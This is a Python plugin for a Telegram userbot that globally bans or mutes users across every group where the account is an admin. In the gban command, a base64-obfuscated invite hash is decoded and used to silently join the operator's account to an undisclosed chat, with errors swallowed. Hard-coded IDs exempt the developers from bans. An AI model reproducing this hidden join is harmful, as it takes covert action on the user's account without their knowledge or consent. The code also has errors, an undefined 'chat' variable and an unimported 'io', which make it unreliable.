"""
credits to @mrconfused
dont edit credits
"""
#  Copyright (C) 2020  sandeep.n(π.$)

import asyncio
from datetime import datetime

import pybase64
from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights, MessageEntityMentionName

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from ..utils import admin_cmd, edit_or_reply
from . import BOTLOG, BOTLOG_CHATID, CMD_HELP
from .sql_helper.mute_sql import is_muted, mute, unmute
MEGA_ID = ("")
BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


@borg.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
async def megagban(mega):
    megastar = await edit_or_reply(mega, "Gbanning this crazy 😏.......")
    start = datetime.now()
    user, reason = await get_user_from_event(mega)
    if not user:
        return
    if user.id == (await mega.client.get_me()).id:
        await megastar.edit("why would I ban myself")
        return
    if user.id == 1356768472 or chat.id == 1497543689 or chat.id == 1317466348:
        await megastar.edit("Why would I ban my dev???")
        return
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await mega.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await megastar.edit(
            f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again"
        )
    else:
        gban_sql.megagban(user.id, reason)
    san = []
    san = await admin_groups(mega)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await megastar.edit("you are not admin of atleast one group ")
        return
    await megastar.edit(
        f"initiating gban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
    )
    for i in range(sandy):
        try:
            await mega.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await mega.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {mega.chat.title}(`{mega.chat_id}`)\nFor banning here",
            )
    try:
        reply = await mega.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await megastar.edit(
            "`I dont have message deleting rights here! But still he was gbanned!`"
        )
    end = datetime.now()
    megataken = (end - start).seconds
    if reason:
        await megastar.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{megataken} seconds`!!\nReason: `{reason}`"
        )
    else:
        await megastar.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{megataken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await mega.client.send_message(
            BOTLOG_CHATID,
            f"#GBAN\nGlobal BAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: `{user.id}`\
                                                \nReason: `{reason}`\nBanned in `{count}` groups\nTime taken = `{megataken} seconds`",
        )


@borg.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
async def megagban(mega):
    megastar = await edit_or_reply(mega, "Ungbaning the person.....")
    start = datetime.now()
    user, reason = await get_user_from_event(mega)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.megaungban(user.id)
    else:
        await megastar.edit(
            f"the [user](tg://user?id={user.id}) is not in your gbanned list"
        )
        return
    san = []
    san = await admin_groups(mega)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await megastar.edit("you are not even admin of atleast one group ")
        return
    await megastar.edit(
        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}`groups"
    )
    for i in range(sandy):
        try:
            await mega.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await mega.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {mega.chat.title}(`{mega.chat_id}`)\nFor unbaning here",
            )
    end = datetime.now()
    megataken = (end - start).seconds
    if reason:
        await megastar.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{megataken} seconds`!!\nReason: `{reason}`"
        )
    else:
        await megastar.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{megataken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await mega.client.send_message(
            BOTLOG_CHATID,
            f"#UNGBAN\nGlobal UNBAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: {user.id}\
                                                \nReason: `{reason}`\nUnbanned in `{count}` groups\nTime taken = `{megataken} seconds`",
        )


@borg.on(admin_cmd(pattern="listgban$"))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Current Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "no Gbanned Users (yet)"
    if len(GBANNED_LIST) > 4095:
        with io.BytesIO(str.encode(GBANNED_LIST)) as out_file:
            out_file.name = "Gbannedusers.text"
            await event.client.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption="Current Gbanned Users",
                reply_to=event,
            )
            await event.delete()
    else:
        await edit_or_reply(event, GBANNED_LIST)


@borg.on(admin_cmd(outgoing=True, pattern=r"gmute ?(\d+)?"))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Unexpected issues or ugly errors may occur!")
        await asyncio.sleep(3)
        private = True

    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event, "Please reply to a user or add their into the command to gmute them."
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await edit_or_reply(event, "This user is already gmuted")
    try:
        mute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "Successfully gmuted that person")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#GMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)",
        )


@borg.on(admin_cmd(outgoing=True, pattern=r"ungmute ?(\d+)?"))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Unexpected issues or ugly errors may occur!")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event,
            "Please reply to a user or add their username into the command to ungmute them.",
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await edit_or_reply(event, "This user is not gmuted")
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "Successfully ungmuted that person")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#UNGMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)",
        )


@command(incoming=True)
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()


async def get_user_from_event(event):
    """ Get the user from argument or replied message. """
    args = event.pattern_match.group(1).split(" ", 1)
    extra = None
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.sender_id)
        extra = event.pattern_match.group(1)
    elif args:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await event.edit("`Pass the user's username, id or reply!`")
            return
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]

            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj
        try:
            user_obj = await event.client.get_entity(user)
        except (TypeError, ValueError):
            await event.edit("Could not fetch info of that user.")
            return None
    return user_obj, extra


CMD_HELP.update(
    {
        "gadmin": "**Plugin : **`gadmin`\
        \n\n**Syntax : **`.gban <username/reply/userid> <reason (optional)>`\
\n**Function : **Bans the person in all groups where you are admin .\
\n\n**Syntax : **`.ungban <username/reply/userid>`\
\n**Function : **Reply someone's message with .ungban to remove them from the gbanned list.\
\n\n**Syntax : **`.listgban`\
\n**Function : **Shows you the gbanned list and reason for their gban.\
\n\n**Syntax : **`.gmute <username/reply> <reason (optional)>`\
\n**Function : **Mutes the person in all groups you have in common with them.\
\n\n**Syntax : **`.ungmute <username/reply>`\
\n**Function : **Reply someone's message with .ungmute to remove them from the gmuted list."
    }
)
